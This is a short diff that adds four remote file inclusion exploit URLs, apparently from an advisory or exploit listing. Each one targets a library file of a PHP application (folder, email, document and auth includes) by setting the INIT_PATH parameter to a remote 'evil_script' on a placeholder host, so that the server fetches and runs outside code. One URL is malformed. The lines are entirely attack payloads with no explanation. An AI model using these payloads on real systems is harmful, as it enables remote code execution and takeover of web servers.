@@ -1,0 +1,4 @@
+http://www.example.com/[path]/lib/folder.class.php?INIT_PATH=http://www.example.com/evil_script?
+http://www.example.com/[path]/lib/email.inc.php?INIT_PATH=http://www.example.comevil_script?
+http://www.example.com/[path]/lib/document.class.php?INIT_PATH=http://www.example.com/evil_script?
+http://www.example.com/[path]/lib/auth.inc.php?INIT_PATH=http://www.example.com/evil_script?
